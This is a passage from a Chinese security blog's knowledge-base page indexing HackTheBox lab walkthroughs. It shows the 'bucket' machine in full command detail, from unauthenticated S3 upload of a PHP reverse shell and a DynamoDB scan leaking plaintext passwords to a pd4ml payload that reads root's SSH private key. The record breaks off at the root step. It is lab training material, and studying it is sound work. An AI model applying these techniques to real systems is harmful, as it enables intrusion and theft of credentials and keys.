---
title: AWS 模拟环境、请求走私与密钥服务
url: https://lucifer11.xyz/knowledge/cloud/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:43.704083
---

# AWS 模拟环境、请求走私与密钥服务

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [S3 写权限与 DynamoDB 数据流](#S3-%E5%86%99%E6%9D%83%E9%99%90%E4%B8%8E-DynamoDB-%E6%95%B0%E6%8D%AE%E6%B5%81)
4. [请求解析差异与 KMS 数据](#%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E4%B8%8E-KMS-%E6%95%B0%E6%8D%AE)
5. [LocalStack 请求与容器边界](#LocalStack-%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%AE%B9%E5%99%A8%E8%BE%B9%E7%95%8C)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# AWS 模拟环境、请求走私与密钥服务

发表于
2026-11-25

分类于

[云与容器安全](/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/)
，
[云服务](/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1/)

阅读次数：

本文字数：
11k

阅读时长 ≈
38 分钟

本章保留 S3、DynamoDB、LocalStack、Secrets Manager 和 KMS 在原靶场中的服务关系。权限、数据结构与应用消费逻辑比单独的 API 名称更能解释各段链如何衔接。

本章保留 S3、DynamoDB、LocalStack、Secrets Manager 和 KMS 在原靶场中的服务关系。权限、数据结构与应用消费逻辑比单独的 API 名称更能解释各段链如何衔接。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/cloud/source.md)
展开全部技术记录

## 分析重点

Bucket 的表结构和 bucket-app 查询顺序决定文件内容如何被带入输出。

Sink 的请求走私来自前后端解析差异，后续 AWS 材料需要独立核对权限。

Stacked 的管理请求与 Docker 挂载连接了不同执行上下文。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [S3 写权限与 DynamoDB 数据流](#case-bucket) | bucket | AWS、S3、DynamoDB |
| [请求解析差异与 KMS 数据](#case-sink) | sink | 请求走私、AWS、KMS、CVE-2019-18277 |
| [LocalStack 请求与容器边界](#case-stacked) | stacked | LocalStack、XSS、Docker |

## S3 写权限与 DynamoDB 数据流

原环境允许枚举 S3 与 DynamoDB，再通过 bucket-app 对 alerts 表的消费关系读取文件。表名、字段名和应用查询次序均在原记录中。

来源 bucket · 原记录 2020-11-07 · 13 个代码块 · 4 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Linux
Difficulty: Medium
Points: 30
Release: 17 Oct 2020
IP: 10.10.10.212

User Blood szymex73 00 days, 00 hours, 41 mins, 20 seconds.
Root Blood szymex73 00 days, 01 hours, 20 mins, 22 seconds.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb116.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` root@kali:~/hackthebox/machine/bucket# nmap -sV -v -p- --min-rate=10000 10.10.10.212 PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open  http    Apache httpd 2.4.41 ``` |

* install aws-cli

|  |  |
| --- | --- |
| ``` 1 ``` | ``` apt-get install awscli ``` |

* configure aws

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` root@kali:~/hackthebox/machine/bucket# aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Default region name [None]: us-west-2 Default output format [None]: json ``` |

* listing the available buckets in s3.bucket.htb

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root@kali:~/hackthebox/machine/bucket# aws s3 ls --endpoint-url http://s3.bucket.htb --no-sign-request 2020-11-07 06:25:03 adserver ``` |

* uploading files to the bucket in s3.bucket.htb

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root@kali:~/hackthebox/machine/bucket# aws s3 cp shell.php s3://adserver/shell.php --endpoint-url http://s3.bucket.htb --no-sign-request upload: ./shell.php to s3://adserver/shell.php ``` |

* accessing the dynamodb, listing the available tables

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` root@kali:~/hackthebox/machine/bucket# aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request {     "TableNames": [         "users"     ] } ``` |

* scanning the enumerated tables, (acessing the values in it)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ``` | ``` root@kali:~/hackthebox/machine/bucket# aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request {     "Items": [         {             "password": {                 "S": "Management@#1@#"             },             "username": {                 "S": "Mgmt"             }         },         {             "password": {                 "S": "Welcome123!"             },             "username": {                 "S": "Cloudadm"             }         },         {             "password": {                 "S": "n2vM-<_K_Q:.Aa2"             },             "username": {                 "S": "Sysadm"             }         }     ],     "Count": 3,     "ScannedCount": 3,     "ConsumedCapacity": null } ``` |

* usernames and passwords are enumerated
* Uploading a php reverse shell and accessing it in http://bucket.htb/shell.php
* now accessing the shell.php provides us with the reverse shell

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ``` | ``` root@kali:~/hackthebox/machine/bucket# nc -lvp 3344 Ncat: Version 7.80 ( https://nmap.org/ncat ) Ncat: Listening on :::3344 Ncat: Listening on 0.0.0.0:3344 Ncat: Connection from 10.10.10.212. Ncat: Connection from 10.10.10.212:45936. Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux  12:21:02 up  1:09,  1 user,  load average: 0.41, 0.14, 0.04 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT roy      pts/0    10.10.14.2       12:10   10:06   0.03s  0.03s -bash uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ python -c 'import pty; pty.spawn("/bin/bash")' /bin/sh: 1: python: not found $ python3 -c 'import pty; pty.spawn("/bin/bash")' www-data@bucket:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@bucket:/$ whoami whoami www-data www-data@bucket:/$ ls /home ls /home roy www-data@bucket:/$ su roy su roy Password: n2vM-<_K_Q:.Aa2  roy@bucket:/$ cd ~ cd ~ roy@bucket:~$ ls ls project  user.txt roy@bucket:~$ cat user.txt cat user.txt fb6d6fd9ef6bc4d570af540eb8f3bed7 ``` |

now we got the user flag

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb117.jpg)

#### privilege esclation

* aws is installed in the system and an internal service port 8000 (web service) and port 4566 (aws service)
* forward the port 8000 to local machine with chisel
* In the bucket-app/index.php the index.php shows another communcation to the internal service, a new table name alerts whichi is accessed with a post request with the values data
* create a new dynamodb table

|  |  |
| --- | --- |
| ``` 1 ``` | ``` /usr/bin/aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566 ``` |

* create a table and insert the values as requested by the index.php

|  |  |
| --- | --- |
| ``` 1 ``` | ``` /usr/bin/aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url http://127.0.0.1:4566 ``` |

* Now after inserting everything needed, make a curl POST

|  |  |
| --- | --- |
| ``` 1 ``` | ``` curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v ``` |

* Check out the http://127.0.0.1:8000/attached.txt in your browser to obtain the id\_rsa
* now use id\_rsa to get root

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ...